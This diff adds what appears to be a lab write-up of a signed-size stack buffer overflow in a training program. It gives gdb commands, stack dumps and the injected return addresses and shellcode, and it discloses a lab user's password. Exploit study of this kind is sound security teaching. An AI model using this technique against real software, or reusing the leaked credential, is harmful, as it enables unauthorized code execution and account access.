@@ -1,0 +1,86 @@
+First, the worst part about this code was that we could use it to directly
+see the contents of README, which revealed that user brown's password was
+'Zsps7Z):'. In addition, there were flaws with the code's security as well.
+
+In this code, the obvious flaw in the security of the program was that the
+size of the text file was 1) user determined and 2) a signed integer. This
+means that we can set the size byte to be a negative number and overflow the
+buffer. In gdb:
+
+    b 18
+    r anderson.txt
+    i f 0
+    x/16x msg + 128
+
+Output:
+
+    (gdb) b 18
+    Breakpoint 1 at 0x8048553: file agent-smith.c, line 18.
+    (gdb) r anderson.txt
+    Starting program: /home/smith/agent-smith anderson.txt
+    You have a problem with authorit
+    
+    Breakpoint 1, display (path=0xbffff9cd "anderson.txt") at agent-smith.c:18
+    18      }
+    (gdb) i f 0
+    Stack frame at 0xbffff820:
+     eip = 0x8048553 in display (agent-smith.c:18); saved eip 0x804857b
+     called by frame at 0xbffff840
+     source language c.
+     Arglist at 0xbffff818, args: path=0xbffff9cd "anderson.txt"
+     Locals at 0xbffff818, Previous frame's sp is 0xbffff820
+     Saved registers:
+      ebp at 0xbffff818, eip at 0xbffff81c
+    (gdb) x/16x msg + 128
+    0xbffff808:     0x00000020      0x0804b008      0x00000002      0xbffff8d4
+    0xbffff818:     0xbffff838      0x0804857b      0xbffff9cd      0x00000000
+    0xbffff828:     0x08048599      0xb7fd2000      0x08048590      0x00000000
+    0xbffff838:     0x00000000      0xb7e454d3      0x00000002      0xbffff8d4
+
+Using the same methodology as part 1 (we're lazy), we simply fill the size
+with 0xff, which turns out to be -1 as a int8_t, but 255 as a size_t. This
+means that we will not return, and that we will get 255 bytes of our file put
+into the buffer. We see that the RIP has 6 pointer spaces between it and the
+end of the buffer, so we simply write the pointer immediately after the RIP
+128/4 + 6 times to make sure that it lands exactly there, and then put the
+shellcode immediately afterwards to make sure it returns there.
+
+Stack before:
+
+(gdb) x/64x msg
+0xbffff788:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff798:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff7a8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff7b8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff7c8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff7d8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff7e8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff7f8:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff808:     0x0804a000      0x080485e2      0x00000002      0xbffff8d4
+0xbffff818:     0xbffff838      0x0804857b      0xbffff9cf      0x00000000
+0xbffff828:     0x08048599      0xb7fd2000      0x08048590      0x00000000
+0xbffff838:     0x00000000      0xb7e454d3      0x00000002      0xbffff8d4
+0xbffff848:     0xbffff8e0      0xb7fdc858      0x00000000      0xbffff81c
+0xbffff858:     0xbffff8e0      0x00000000      0x0804824c      0xb7fd2000
+0xbffff868:     0x00000000      0x00000000      0x00000000      0xd505ebc9
+0xbffff878:     0xe25c4fd9      0x00000000      0x00000000      0x00000000
+
+Stack after:
+
+(gdb) x/64x msg
+0xbffff788:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff798:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff7a8:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff7b8:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff7c8:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff7d8:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff7e8:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff7f8:     0xbffff820      0xbffff820      0xbffff820      0xbffff820
+0xbffff808:     0x000000c6      0xbffff820      0xbffff820      0xbffff820
+0xbffff818:     0xbffff820      0xbffff820      0x895e1feb      0xc0310876
+0xbffff828:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08
+0xbffff838:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff
+0xbffff848:     0x732f6e69      0xb7fd0a68      0x00000000      0xbffff81c
+0xbffff858:     0xbffff8e0      0x00000000      0x0804824c      0xb7fd2000
+0xbffff868:     0x00000000      0x00000000      0x00000000      0xd505ebc9
+0xbffff878:     0xe25c4fd9      0x00000000      0x00000000      0x00000000
